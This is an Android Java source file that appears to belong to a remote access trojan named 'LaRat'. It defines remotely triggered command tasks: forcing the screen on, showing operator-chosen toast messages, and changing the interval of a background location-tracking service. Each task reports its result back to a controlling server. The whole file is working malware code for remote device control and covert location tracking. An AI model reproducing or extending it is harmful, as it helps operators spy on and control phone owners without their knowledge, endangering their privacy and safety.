package com.c4wd.commands;

import android.content.Context;
import android.os.AsyncTask;
import android.os.PowerManager;
import android.widget.Toast;

import com.c4wd.larat.LaRatLocationManager;

public class GenericTasks {
    public static class ScreenOnTask extends AsyncTask<Object, Void, String> {
        @Override
        protected String doInBackground(Object... ctx) {
            PowerManager pm = (PowerManager) ((CommandContext)ctx[0]).getContext().getSystemService(Context.POWER_SERVICE);
            final PowerManager.WakeLock wl = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK |PowerManager.ACQUIRE_CAUSES_WAKEUP |PowerManager.ON_AFTER_RELEASE, "");
            wl.acquire();
            return "Screen on complete!"; //example return string
        }
        @Override
        protected void onPostExecute(String result) {
            //This is where you can send a request to the server with update information
            // in this case, the string returned from doInBackground
            Command.reportResult(result);
        }
        @Override
        protected void onPreExecute() {}
        @Override
        protected void onProgressUpdate(Void... values) {}
    }

    public static class ToastTask extends AsyncTask<Object, Void, Object> {

        private CommandContext context;

        @Override
        protected Object doInBackground(Object... objects) {
            context = (CommandContext)objects[0];
            return null;
        }

        @Override
        protected void onPostExecute(Object o) {
            Toast.makeText(context.getContext(),
                    context.getArgument(0).toString(),
                    context.getArgument(1).toString().equals("LONG") ? Toast.LENGTH_LONG : Toast.LENGTH_SHORT
            ).show();
            Command.reportResult("Toast success!");
        }
    }

    public static class SetLocationIntervalTask extends AsyncTask<Object, Integer, Long>  {

        @Override
        protected Long doInBackground(Object... objects) {
            CommandContext context = (CommandContext)objects[0];
            long interval = Long.parseLong(context.getArgument(0).toString());
            LaRatLocationManager.LOCATION_REQUEST_INTERVAL = interval;
            LaRatLocationManager.startLocationService(context.getContext());
            return interval;
        }

        @Override
        protected void onPostExecute(Long interval) {
            Command.reportResult("Successfully updated the interval to " + Long.toString(interval) + " milliseconds");
        }
    }
}
